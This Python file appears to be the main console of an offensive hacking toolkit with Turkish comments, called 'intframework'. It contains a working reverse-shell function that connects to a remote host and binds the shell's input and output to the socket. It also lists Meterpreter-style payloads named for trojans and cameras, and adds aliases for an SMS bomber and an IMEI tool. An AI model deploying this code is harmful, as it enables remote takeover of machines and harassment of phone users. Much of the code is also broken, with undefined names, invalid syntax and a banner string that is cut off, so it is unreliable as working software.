#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pyfiglet import Figlet
from colorama import Fore, init
import threading
import requests
import time
import sys
import os
import base64
import time as t
import argparse
import sys
import platform
import getpass
import subprocess
import socket
from netaddr import IPNetwork, IPAddress
import argparse
import socket
import threading
import time
import sys
import random
import urllib.request
from queue import Queue
from modules import evasionint
from modules import usersearcher
from modules.usersearcher import searchus, banner, outer_func
from modules.exploit_searcher import search_exploits, download_exploit
from modules import exploit_searcher
from modules import expdatabase
from modules.expdatabase import create_option, create_exploit, show_options, set_option, run_exploit, use_framework, import_framework, initialize_framework
from modules.expdatabase import import_framework, show_options, set_option, run_exploit, use_framework, create_exploit
from modules import intmodules

def check_network():
    try:
        # Attempt to connect to Google's DNS server
        socket.create_connection(("8.8.8.8", 53))
        return True
    except OSError:
        return False
        print("You are int-py mode")
# intconsole komutu
    # ASCII sanatı
	
ascii_sanat = """⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⠶⠶⠶⠶⢦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠛⠁⠀⠀⠀⠀⠀⠀⠈⠙⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⣠⡴⠞⠛⠉⠉⣩⣍⠉⠉⠛⠳⢦⣄⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡀⠀⣴⡿⣧⣀⠀⢀⣠⡴⠋⠙⢷⣄⡀⠀⣀⣼⢿⣦⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣧⡾⠋⣷⠈⠉⠉⠉⠉⠀⠀⠀⠀⠉⠉⠋⠉⠁⣼⠙⢷⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣇⠀⢻⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠀⣸⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣹⣆⠀⢻⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡟⠀⣰⣏⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠞⠋⠁⠙⢷⣄⠙⢷⣀⠀⠀⠀⠀⠀⠀⢀⡴⠋⢀⡾⠋⠈⠙⠻⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀⠀⠹⢦⡀⠙⠳⠶⢤⡤⠶⠞⠋⢀⡴⠟⠀⠀⠀⠀⠀⠀⠙⠻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣼⠋⠀⠀⢀⣤⣤⣤⣤⣤⣤⣤⣿⣦⣤⣤⣤⣤⣤⣤⣴⣿⣤⣤⣤⣤⣤⣤⣤⡀⠀⠀⠙⣧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣸⠏⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⢠⣴⠞⠛⠛⠻⢦⡄⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⡟⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⣿⣿⢶⣄⣠⡶⣦⣿⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⢻⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣾⠁⠀⠀⠀⠀⠘⣇⠀⠀⠀⠀⠀⠀⠀⢻⣿⠶⠟⠻⠶⢿⡿⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠈⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢰⡏⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⢾⣄⣹⣦⣀⣀⣴⢟⣠⡶⠀⠀⠀⠀⠀⠀⣼⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣭⣭⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⢿⡀⠀⠀⠀⠀⠀⠀⣀⡴⠞⠋⠙⠳⢦⣀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⢰⡏⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⢿⣄⣀⠀⠀⢀⣤⣼⣧⣤⣤⣤⣤⣤⣿⣭⣤⣤⣤⣤⣤⣤⣭⣿⣤⣤⣤⣤⣤⣼⣿⣤⣄⠀⠀⣀⣠⡾⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠻⢧⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠼⠟⠛⠛⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
. ⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ⣿⣿⣿⣿⣿⣷⣷⣶⣿⣿ """	
print(ascii_sanat)
    # 5 saniye boyunca animasyonu çalıştır
os.system("python3 startoolkit.py")


    


     

time.sleep(0.1)   

init()      
global jobs
jobs = {}
# Initialize jobs dictionary
jobs = {}

# Function to add a job
def add_job(job_name, exploit=None):
    job_id = len(jobs) + 1
    jobs[job_id] = {'name': job_name, 'exploit': exploit}

# Function to list jobs
def list_jobs():
    for job_id, job_info in jobs.items():
        job_name = job_info['name']
        exploit = job_info['exploit']
        print(f"[{job_id}] {job_name}: executed")
        print("EXPLOITS")
        print("==========")
        print(f"    {job_id} {exploit if exploit else 'None'}")
        

# Job silme fonksiyonu
def kill_job(job_id):
    if job_id in jobs:
        print(f"Job [{job_id}] ({jobs[job_id]}) stopped and removed.")
        del jobs[job_id]
    else:
        print(f"No job found with ID: {job_id}")
def exit():
	print("BYE BYE")
	os.system("exit")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
os.system("clear")
if check_network():
	print("you are inthacker-mode")
	add_job("network")
else:
	print("you are handler mode")
def bind_tcp(lhosts, lports):
	try:
		s.bind(lhosts, lports)
		conn, addr = s.accept()
		print("tcp addr is accepted ")
	except:
		print("tcp addr is not value or not accepted")
def reverse_tcp(rhosts, rports, addr):
    try:        
        # Connect to the remote host and port
        s.connect((rhosts, rports))
        
        # Redirect standard input/output/error to the socket
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        
        subprocess.call([addr, '-i'])
    except Exception as e:
        print(f"Error: {e}")
        s.close()
def payloads():
    global meterpreter
    global payloads
    global payload_name
    global platform_g
    
    platform_g = platform.system()
    payload_name = ["/intchat/spesific", "/intframework/effuse/1", "/intframework/effuse/2", "/intframework/effuse/3", "/intframework/effuse/4", "/intframework/effuse/5", "/intframework/effuse/6", "/intframework/effuse/7", "/intframework/web/1", "/intframework/web/2", "/intframework/web/3", "/intframework/web/4", "/intframework/web/5", "/intframework/introjan/1", "/intframework/introjan/2", "/intframework/cam/1"]
    
    meterpreter = []
    for pn in payload_name:
        meterpreter.append(f"/{platform_g}{pn}/payloads/meterpreter/reverse_tcp")
        meterpreter.append(f"/{platform_g}{pn}/payloads/meterpreter/bind_tcp")
        meterpreter.append(f"/{platform_g}{pn}/payloads/meterpreter_reverse_tcp")
        meterpreter.append(f"/{platform_g}{pn}/payloads/meterpreter_bind_tcp")

def search_payloads(term):
    global meterpreter
    return [payload for payload in meterpreter if term in payload]
def strips(help_input, name):
    return help_input.split("=", 1)[1].strip() if "=" in help_input else help_input[help_input.find(f"set {name} ") + len(f"set {name} "):].strip() if help_input.find(f"set {name} ") != -1 else help_input.strip()
def print_payloads(payload_list):
    for payload in payload_list:
        platform_part = payload.split('/')[1]
        path_part = '/'.join(payload.split('/')[2:])
        path_part_colored = path_part.replace('effuse', f"{Fore.BLUE}effuse{Style.RESET_ALL}")
        path_part_colored = path_part_colored.replace('web', f"{Fore.BLUE}web{Style.RESET_ALL}")
        path_part_colored = path_part_colored.replace('introjan', f"{Fore.BLUE}introjan{Style.RESET_ALL}")
        path_part_colored = path_part_colored.replace('cam', f"{Fore.BLUE}cam{Style.RESET_ALL}")
        platform_colored = f"{Fore.RED}{platform_part}{Style.RESET_ALL}"
        meterpreter_colored = payload.split('/')[-1].replace('meterpreter', f"{Fore.RED}meterpreter{Style.RESET_ALL}")
        meterpreter_colored = meterpreter_colored.replace('reverse_tcp', f"{Style.BRIGHT}reverse_tcp{Style.RESET_ALL}")
        meterpreter_colored = meterpreter_colored.replace('bind_tcp', f"{Style.BRIGHT}bind_tcp{Style.RESET_ALL}")
        final_payload = f"/{platform_colored}/{path_part_colored}"
        print(final_payload.replace(payload.split('/')[-1], meterpreter_colored))
def used(used):
	if used == "used":
		pass
	else:
		print('you are not used')
def reverse_used(used, helper):
	if used == "used":
		print(f"[{Fore.RED}intbase{Fore.RESET}] you are used the tool", f"""
		example usage:
			{helper}
		""")
	else:
		pass
def dev_tools(dir, tool, norm):
	os.system(dir)
	if tool.lower() == "imei":
		os.system("""echo "imei='python /data/data/com.termux/files/home/intframework/imei.py' >> ~/intframework/.bashrc """)
		used = "used"
		used(used)
	if tool.lower() == "sms" or "smsbomber" or "smsbomb":
		os.system("""echo "alias sms='python /data/data/com.termux/files/home/intframework/sms.py' >> ~/intframework/.bashrc """)
	if tool.lower() == "connectbot":
		os.system("""echo "alias connectbot='python /data/data/com.termux/files/home/intframework/connectbot.py' >> ~/intframework/.bashrc """)
	used_dev_tools = "used"
	os.system("source ~/.bashrc")
	used(used_dev-tools)
def launch_normaltools():
	pass
def search_evasions():
	os.system("python3 evasionint.py -s")
def create_command_pool():
	pool = {}
	def get_command(command, v):
		pool["intmeterpreter"] = 'meterpreter'
		pool["intai"] = "intaiV2"
		pool["set"] = "bset"
		pool["banner"] = "banner"
		pool["monitor"] = "http://"
		pool += "intframework"
		pool["intframework"] = "intconsole"
		pool["dev-tool"] = "dev-toolz"
		pool["dev-tools"] = "dev-tool"
		pool["dev-toolz"] = "dev-tools"
		pool["payload"] = "py"
		pool["payload"] = "exploit"
		pool["exploit"] = "payload"
		pool["dns"] = "host"
		pool["auxiliary"] = "payload"
		pool["nops"] = "exploit"
		pool["auxiliary"] = "exploit"
		pool["nops"] = "payload"
		pool["auxiliary"] = "nops"
		pool["post"] = "gmail.com"
		pool["post_exploit"] = "exploitdb"
		pool["exploitdb"] = "exploit" and "https://www.exploitdb.com"
		pool["intconsole"] = "consoleV4"
		pool["consoleV4"] = "intconsole"
		pool["tools"] = "auxiliary"
		pool["dork"] = "google"
		pool["osint"] = "intframework is a osint and replit tool"
		pool["replit"] = "repl"
		pool["api"] = "os"
		pool["apis"] = "api.intframework"
		pool["weather_api"] = "https://api.collectapi.com/news/getNews?country=tr&tag=general"		
		pool[command] = v
	payload_pool = {}
	def websites(site, v):
		payload_pool["intframework"] = "http://"
		payload_pool["intmini"] = "https://"
		payload_pool["dark_web"] = "http://" or "https://","socks5h://127.0.0.1:9050"
		def dork(word, site):
			payload_pool["google dork"] = f'link="{site}" "{word}"'
		payload_pool["intbase"] = "http://intikam21.com/errors"
		payload_pool[site] = v
		# Daha fazla havuz oluşturmayı tercih etmem çünkü kod sınırsız bytes ve koda ulaşabilir

def listen_p(ip, port):
    # Soket oluştur
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((ip, port))
    server_socket.listen(5)  # 5'e kadar bekleme kuyruğu
    print(f"Listening on {ip}:{port}")

    while True:
        client_socket, addr = server_socket.accept()
        print(f"Connection from {addr}")

        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            print(f"Received data: {data.decode('utf-8')}")
        
        client_socket.close()
        print(f"Connection from {addr} closed")


def bannerss():
	global bannerss	
	bannerss = help_input[12:] or help_input[15:]
def banner():
	import random
	global banners
	banners = [
    """{Fore.RED}
    ⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⠶⠾⠿⠛⠛⠻⠿⠶⣶⣤⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣾⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣆⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⠇⡤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡈⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⡆⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠁⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠸⣧⢸⡆⢀⣀⣀⣤⡀⠀⠀⢀⣤⣀⣀⡀⠀⡟⣸⡟⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠹⣿⠁⣿⣿⣿⣿⡟⠀⠀⠸⣿⣿⣿⣿⠆⣿⠟⠀⠀⠀⣀⠀
⠀⢰⡟⢿⣆⠀⠀⣿⠀⠙⢿⣿⠟⠀⣠⣄⠀⠹⣿⣿⠟⠀⢹⠀⠀⣠⡿⢻⠀
⣠⡾⠃⠈⠻⢷⣦⣽⣄⡀⠀⠀⠀⢸⣿⣿⣧⠀⠀⠀⢀⣠⣿⣤⡶⠟⠁⠘⢿⣆
⠻⠷⠶⠶⣶⣤⣈⠙⠻⣿⣷⣦⠀⠸⠋⠙⠟⠀⣠⣾⣿⠟⠋⣁⣠⣴⠶⠶⠟
⠀⠀⠀⠀⠀⠉⠛⠿⣶⣼⠿⣿⣲⡤⡤⡤⢤⢰⣿⡏⣿⣶⠿⠛⠉⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣠⣴⣿⡄⠻⣹⡟⡟⡟⣻⣻⠽⠁⣿⣦⣄⡀⠀⠀⠀⠀⠀
⠀⠀⣶⠾⠶⠾⠟⠋⣁⣼⣷⡀⠀⠉⠉⠉⠉⠀⢀⣼⣧⣀⠉⠛⠷⠶⠿⣶⠀
⠀⠀⠙⣷⡄⢀⣴⠿⠛⠁⠀⠙⠳⠶⠤⠴⠶⠞⠋⠀⠈⠙⠻⣶⡄⠀⣾⠟⠀
⠀⠀⠀⢸⣷⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣶⡿⠀⠀⠀
-----------------------------------------------------------

___ _   _ _____ ___ _  __    _    __  __ ____  _ _ ____
|_ _| \ | |_   _|_ _| |/ /   / \  |  \/  |___ \/ ( ) ___|
 | ||  \| | | |  | || ' /   / _ \ | |\/| | __) | |/\___ \
 | || |\  | | |  | || . \  / ___ \| |  | |/ __/| |  ___) |
|___|_| \_| |_| |___|_|\_\/_/   \_\_|  |_|_____|_| |____/

 ____  _____ ____  _  _______ ___  ____
|  _ \| ____/ ___|| |/ /_   _/ _ \|  _ \
| | | |  _| \___ \| ' /  | || | | | |_) |
| |_| | |___ ___) | . \  | || |_| |  __/
|____/|_____|____/|_|\_\ |_| \___/|_|(({Fore.RESET}""",
    Fore.RED + """ 
    ___ _   _ _____ ___ _  __    _    __  __ ____  _ _ ____
|_ _| \ | |_   _|_ _| |/ /   / \  |  \/  |___ \/ ( ) ___|
 | ||  \| | | |  | || ' /   / _ \ | |\/| | __) | |/\___ \
 | || |\  | | |  | || . \  / ___ \| |  | |/ __/| |  ___) |
|___|_| \_| |_| |___|_|\_\/_/   \_\_|  |_|_____| """ + Fore.RESET,
    """ 
    {Fore.RED}
   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣶⣿⠿⢿⣿⣿⣿⡿⣿⣿⣷⣦⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⡿⢋⣵⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠟⣫⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⣿⣿⠃⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣞⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠦⡄⠀⠀⣀⣀⣤⣤⣴⢤⣤⣤⣶⣾⣿⣿⣿⣿⣿⡿⠃⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⢿⣿⣿⣿⣿⣿⣿⠿⢛⣀⣤⣤⣄⣄⣀⣻⣻⣘⣠⣤⣧⣿⣧⣤⣿⣿⣿⣿⠇⣿⠻⢜⡻⠿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⣷⣿⣿⣿⣻⣭⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢟⣩⣾⣿⣿⣿⣿⠟⣸⡇⠰⡦⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣻⡿⣿⣭⣛⡛⠿⣿⣿⡿⠿⠿⠿⠟⢿⣛⣹⣽⣯⣶⣿⣿⣿⣿⣿⣿⣿⣏⠸⣟⣓⣢⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡦⠄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣾⣟⣿⣯⣿⣿⣿⣷⣋⣀⠀⠀⠀⠀⢀⣤⣿⣿⣿⣿⣿⣿⣿⣿⡏⠉⠉⠉⠉⠉⠉⠉⠉⠛⠛⠛⠉⠉⠉⠙⠋⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣷⣿⣿⣿⣿⣿⣿⣽⣯⣽⣷⡆⠀⠀⠻⠿⠓⠛⠛⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢡⣭⡹⢿⣿⠃⠀⠀⠀⠘⢯⠀⢀⣀⣀⣀⢠⣤⣬⣧⣿⣷⣮⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣷⣄⠀⠀⠀⣀⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣯⣯⣩⣽⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⢟⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢏⣵⣾⣿⢣⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣛⣵⣿⣿⠿⣣⣾⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣛⣛⣛⣯⣿⣶⣿⣿⠿⣋⣽⣾⣿⣿⣿⠀⢰⣆⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠋⣠⣠⣿⣝⢻⣿⣿⣿⣿⣿⣿⣿⣿⢿⣛⣻⣿⣶⣿⣿⣿⣿⣿⣿⡇⣴⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⣴⣿⣴⣾⢹⣿⣿⠟⠋⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⣻⣿⣿⣿⣿⣿⢳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣯⣿⠿⠁⠀⠀⠈⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⣠⣾⣿⣿⣿⣿⢟⣩⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣳⠟⠁⠀⠀⠀⠀⣼⡇⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⡿⣴⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⠀⠀⠀⠀⠀⢈⠉⠉⢩⡿⠏⠀⣀⣀⠀⠀⠀⣿⠇⠀⢀⣦⢨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢛⣾⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⠿⠲⠄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣶⢿⣷⣶⡀⠀⢠⣿⠀⢀⣿⠃⠀⠀⠻⣿⠃⠀⠐⣿⠀⠀⢸⡿⠿⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠱⠟⠛⠙⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⣿⣿⢻⣿⠃⠀⣾⡇⠀⢸⣿⠀⠀⠀⢠⣶⡄⠀⢸⣿⠀⠀⣾⡇⠀⠀⠀⠀⠀⣿⣿⣿⣯⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠉⣙⡀⠀⠀⠀⣿⡇⠀⢸⣿⠀⠀⣴⠟⠻⣿⣀⣼⡟⠀⠀⣿⡇⠀⠀⠀⠀⠀⢸⣿⣯⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢠⣤⣠⣶⣦⣴⣿⣿⣆⠀⠀⣿⡇⠀⢸⣿⣦⣀⣿⣶⣾⡿⠟⠉⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⢸⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠈⠙⠻⠋⠙⠋⠙⠛⢻⣿⠀⢀⣿⠃⠀⣼⡟⢿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⣿⠇⠀⠀⠀⠀⠐⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣠⣴⣿⣶⣶⣶⡿⠃⠀⣾⣏⣠⣼⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢾⠟⠉⠉⠛⠛⠉⠀⠀⠀⠙⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
   {Fore.RESET} """,
    """
 {Fore.BLUE}   intninja is waiting for his prey {Fore.RESET}
{Fore.RED}
